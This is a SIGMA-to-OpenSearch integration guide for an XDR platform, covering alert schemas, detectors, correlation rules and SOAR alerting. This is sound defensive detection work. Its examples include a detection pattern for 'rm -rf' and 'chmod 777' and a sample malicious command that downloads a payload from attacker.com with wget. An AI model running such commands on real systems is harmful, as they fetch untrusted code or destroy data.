# SIGMA Integration Guide for XDR Platform

This document explains how to integrate SIGMA detection rules with the XDR platform using OpenSearch Security Analytics, without implementing rule engines on the agent.

## Architecture Decision

**Why OpenSearch-side, not agent-side?**

1. **Agent constraints**: Agents are resource-limited; SIGMA is complex (time windows, aggregation, correlation)
2. **Operational efficiency**: Centralized rule management + rapid iteration without agent restarts
3. **Supported approach**: VirusTotal, Elastic, and others implement correlation at the backend, not the agent
4. **Latency acceptable**: Milliseconds of delay for correlation worth the operational simplicity

## Recommended Flow

```
Agent                                  OpenSearch
  │
  ├─ Telemetry                           │
  │  (process, network, file, etc)       │
  │  ────────────────────────→           │
  │                                      ├─ Collectors (pipeline)
  │                                      │
  ├─ Single-Event Detection              │
  │  (YARA, hash, static analysis)       │
  │  ────────────────────────→ Alert     │
  │                           {          │
  │                            event.module: "detection.malware",
  │                            rule.id, rule.name, method, ...
  │                           }
  │                                      ├─ Ingest into alerts index
  │                                      │
  │                                      ├─ Security Analytics Detector
  │                                      │  (Scans .xdr-agent-alerts*)
  │                                      │
  │                                      ├─ Findings (pre-correlation)
  │                                      │  trigger → Correlation Rules
  │                                      │
  │                                      └─ Correlation Engine (SIGMA syntax)
  │                                         (time windows, aggregations)
  │                                         Emit Correlated Findings
  │
  ← Detection Result ─────────────────────
  (optional escalation, prevention action)
```

## Step 1: Export Agent Detection Schema

Agent alerts are sent to OpenSearch with schema:

```json
{
  "@timestamp": "2026-03-22T10:30:45.123Z",
  "event": {
    "module": "detection.malware",
    "type": "alert",
    "category": "threat",
    "action": "alert",
    "severity": "high"
  },
  "rule": {
    "id": "test_suspicious_bash",
    "name": "Test: Suspicious Bash",
    "description": "matched YARA-X signature"
  },
  "file": {
    "path": "/tmp/test-yara-match.txt",
    "sha256": "abc123..."
  },
  "process": {
    "pid": 1234,
    "name": "bash",
    "command_line": "/bin/bash -c whoami"
  },
  "user": {
    "name": "root"
  },
  "host": {
    "name": "prod-server-01",
    "id": "agent-uuid"
  },
  "method": "yara-x",
  "parent_process": {
    "pid": 5678,
    "name": "systemd"
  }
}
```

**Key fields for SIGMA correlation**:
- `rule.id`, `rule.name` — Detection source
- `method` — yara-x, static, hash, behavioral
- `host.name`, `host.id` — Asset identification
- `user.name` — Attribution
- `process.*`, `parent_process.*` — Process ancestry
- `file.path`, `file.sha256` — File identification
- `@timestamp` — Event ordering

## Step 2: Create Security Analytics Detector

In OpenSearch Dashboards → Security Analytics:

### 2.1 Create Detection Rule (Pre-Correlation Detector)

```yaml
Name: XDR Agent Malware Detection
Description: Groups alerts from xdr-agent malware detection
Log type: App Logs  # or custom

Detection:
  product: xdr-agent
  service: detection
  category: malware_detection

Field Mapping:
  timestamp: @timestamp
  id: event.id
  plugin: rule.id
  source: rule.name
  severity: event.severity

Trigger: 
  Single finding triggers immediately (no time window needed here)
```

### 2.2 Create Sigma-Style Correlation Rule (Using Detection Correlation)

Instead of Sigma YAML, use OpenSearch Correlation Rules:

**Scenario**: "Multiple YARA hits from same user within 5 minutes = escalation risk"

```
Name: Suspicious_Rapid_Malware_Detections
Type: Event Count
Severity: High

Condition:
{
  "detection": "XDR Agent Malware Detection",
  "filter": [
    { "event.module": "detection.malware" },
    { "method": "yara-x" }
  ],
  "group_by": ["user.name", "host.name"],
  "timeframe": "5m",
  "threshold": 3  // 3+ detections = correlation triggered
}

Action: Generate Finding → Alert → Escalate to SOAR
```

## Step 3: SIGMA Rule Translation (Mapping)

If you have existing SIGMA rules, translate them as follows:

### Example SIGMA Rule:

```yaml
title: Suspicious Bash Script Execution
logsource:
  product: linux
  service: shell
detection:
  bash:
    process.name: "bash"
    process.command_line|contains: "-c"
  shell_commands:
    process.command_line|contains:
      - "rm -rf"
      - "chmod 777"
  condition: bash and shell_commands
---
```

### Translate to OpenSearch Correlation Rule:

```
Name: Correlation_Suspicious_Bash_Execution
Type: Time Window Aggregation

Preconditions:
1. Process logs available in OpenSearch (from xdr-agent process telemetry)
2. Alert index has `process.name`, `process.command_line` fields

Rule Logic:
{
  "detection": "Process Execution Finder",  // Custom detector via Anomaly Detection or Sigma plugin
  "filter": [
    { "process.name": "bash" },
    { "process.command_line": "/.*-c.*/" },  // regex match
    { "process.command_line|contains": ["rm -rf", "chmod 777"] }
  ],
  "group_by": ["user.name", "host.id"],
  "timeframe": "1m",
  "threshold": 1  // Single occurrence already suspicious in this context
}
```

## Step 4: Leverage Agent Detection Capabilities

The agent **already handles single-event detection** via YARA. Stack correlation on top:

**Agent sends** → YARA alert: `{rule.id: "test_suspicious_bash", method: "yara-x"}`

**OpenSearch layers**:

1. **Detector** — Validates alert schema
2. **Correlation** — Patterns over time (Sigma syntax)
3. **Response** — Automated playbooks (disable user, block IP, etc.)

## Step 5: Setup Using Security Analytics Plugin (Practical)

### 5.1 Install/Enable Security Analytics in OpenSearch Dashboards

```bash
# If not already bundled, install via plugin manager
opensearchctl plugin install security-analytics
```

### 5.2 Configure Threat Intel Feeds (Optional)

Add IP reputation, hash blocklists, etc.:

```bash
PUT _plugins/_security_analytics/threat_intel/feeds
{
  "feed_type": "ipreputation",
  "feeds": [
    {
      "id": "virustotal_ips",
      "url": "https://feeds.virusti...",
      "refresh_interval": "1h"
    }
  ]
}
```

### 5.3 Create Detection Rule in UI

1. **Security Analytics** → **Detectors**
2. **Create Detector**
   - Name: `XDR_Agent_Detections`
   - Log Type: `app_logs` or create new `xdr-agent`
   - Detection Rules: Import/Create SIGMA-compatible rules
   - Alert Severity: Inherit from `event.severity`
3. **Save & Activate**

### 5.4 Create Correlation Rule

1. **Security Analytics** → **Correlation Rules**
2. **Create Rule**
   - Name: `Multi_Malware_Event_Correlation`
   - Detection Condition: `match_count("XDR_Agent_Detections") >= 3 in 5m`
   - Grouping: `user.name + host.name`
3. **Save & Activate**

## Step 6: Emit Alerts to SOAR/Ticketing

Once correlation findings are generated, use OpenSearch Actions & Alerting to route to:

- **Slack**: Threat channel notification
- **PagerDuty**: On-call escalation
- **Splunk SOAR (Phantom)**: Automated playbook (e.g., revoke user session, quarantine host)
- **ServiceNow**: Create incident ticket

### Example Alerting Rule:

```yaml
Name: Escalate High-Risk Correlations
Trigger: Correlation rule "Multi_Malware_Event_Correlation" fires
Actions:
  - POST to https://api.pagerduty.com/incidents (critical severity)
  - Slack webhook: severity > high → #security-alerts
  - Create SOAR ticket with auto-assign to SOC team
```

## Step 7: Optional - Advanced Behavioral Correlation

For multi-stage attack patterns (MITRE ATT&CK):

Use OpenSearch **Anomaly Detection** + **Correlation**:

1. **Setup**: Run unsupervised learning on process/network baselines
2. **Detect**: When deviation occurs (e.g., unusual outbound connection + process execution), emit anomaly
3. **Correlate**: Combine anomaly + YARA alert → escalate to threat response

Example:
```
Process execution: bash -c "wget attacker.com/payload"
  + Anomaly Detection: "Unusual outbound domain" (ML model)
  + YARA: "test_suspicious_bash" match
  = Correlation Finding → PagerDuty → SOC + endpoint isolation playbook
```

## Implementation Checklist

- [ ] Setup OpenSearch Security Analytics plugin (if not bundled)
- [ ] Ingest agent alerts to `.xdr-agent-alerts*` index
- [ ] Create basic detector for XDR agent events
- [ ] Test end-to-end: trigger YARA on agent → alert in OpenSearch
- [ ] Create correlation rule for time-window aggregation
- [ ] Configure SOAR/alerting integration (PagerDuty, SOAR platform, etc.)
- [ ] Threat team writes correlation rules using provided field mapping
- [ ] Run detection/correlation dry-run against historical data
- [ ] Enable alerting → live monitoring

## FAQ

### Q: Why not implement SIGMA on the agent?

**A**: SIGMA requires time-window correlation, aggregation, and complex condition evaluation. The agent is single-event focused. Correlation belongs in a data lake (OpenSearch) with access to historical context.

### Q: Can I still use YARA on the agent?

**A**: Yes! YARA is lightweight, deterministic, and perfect for single-event file scanning. The agent runs YARA; OpenSearch correlates.

### Q: How do I convert my Sigma rules?

**A**: Translation is manual but straightforward:
- Logsource → Detection trigger (filter by source)
- Detection conditions → Time-window aggregations in OpenSearch
- Correlation rules → POST to Security Analytics API or UI

### Q: What if OpenSearch goes down?

**A**: Agent continues shipping events to a buffer/queue. Alerts are **not** lost; they queue until connectivity restored. Single-event detections remain local to the agent.

### Q: Can I use SIGMA in Splunk/ELK instead?

**A**: Yes. Replace OpenSearch with your SIEM. The agent sends normalized ECS events; any SIEM can ingest and correlate via SIGMA or native rules.

---

**Last Updated**: 2026-03-22  
**Status**: Integration guide complete; ready for threat team implementation
